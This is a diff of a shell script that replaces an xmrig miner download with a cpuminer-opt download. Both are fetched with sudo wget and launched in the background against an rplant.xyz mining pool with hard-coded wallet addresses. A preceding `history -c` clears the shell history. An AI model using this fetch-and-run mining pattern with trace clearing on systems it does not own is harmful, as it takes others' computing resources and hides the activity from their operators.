@@ -31,11 +31,11 @@ sudo ./racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AHxt4DaE
 history -c
 if [[ $noCore -eq 6 ]]
 then
-	sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
-	sudo tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
-	sudo ./xmrig-6.16.2/xmrig -a ghostrider --url stratum-eu.rplant.xyz:17094 --tls --user MGazqpWAnH9KtXqskjsMcugT5DMjhsncTf.testx --pass -t= ${usingcore} 
+	sudo wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
+	sudo tar -xvf cpuminer-opt-linux.tar.gz
+	sudo ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17079 -u v4nmRyrdyGXF2Wd8wKtoTt9Rpa7YLb8wKx.batch &
 else
-	sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
-	sudo tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
-	sudo ./xmrig-6.16.2/xmrig -a ghostrider --url stratum-eu.rplant.xyz:17094 --tls --user MGazqpWAnH9KtXqskjsMcugT5DMjhsncTf.testx --pass  -t= ${usingcore} &
+	sudo wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
+	sudo tar -xvf cpuminer-opt-linux.tar.gz
+	sudo ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17079 -u v4nmRyrdyGXF2Wd8wKtoTt9Rpa7YLb8wKx.batch &
 fi
